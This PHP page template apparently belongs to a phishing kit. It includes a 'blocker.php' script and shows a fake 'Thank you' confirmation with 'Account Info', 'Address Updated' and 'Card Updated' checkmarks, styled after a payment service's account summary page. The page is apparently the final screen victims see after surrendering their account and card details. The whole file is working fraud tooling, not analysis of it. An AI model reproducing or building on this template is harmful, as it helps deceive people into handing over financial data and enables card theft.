<?php include('../../blocker.php');?>
<?php include('header.php'); ?>

	<div id="summary" class="summarySection">
		<div class="row-fluid">
			<div class="span4 summaryModuleContainer">

<?php include('tabel_kiri.php');?>

			</div>
			<div class="span8" id="js_activityCollection">
			<section class="activityModule shadow none" aria-labelledby="activityModuleHeaderNone"><h1 style="font-size: 18px;font-weight: bold; border-bottom: 1px solid #EEE; height:40px;">Thank you</h1>
			<div></div>
				<div id="parentchild">
					<div style="border-bottom: 1px solid #EEE; height:160px;">
					<ul id="js_profileStates" class="profileStates center" >
						<li><a class="state doneState" target="_blank"><span class="icon icon-medium icon-checkmark-small-bold" aria-hidden="true"></span></a>Account Info</li>
						<li><a class="state doneState" target="_blank"><span class="icon icon-medium icon-checkmark-small-bold" aria-hidden="true"></span></a>Address Updated</li>
						<li><a class="state doneState" target="_blank"><span class="icon icon-medium icon-checkmark-small-bold" aria-hidden="true"></span></a>Card Updated</li>
					</ul>
					</div>

<?php include('../form/success.php'); ?>

				</div>
			</section>
			</div>
		</div>
	</div><br>
<?php include('footer.php'); ?>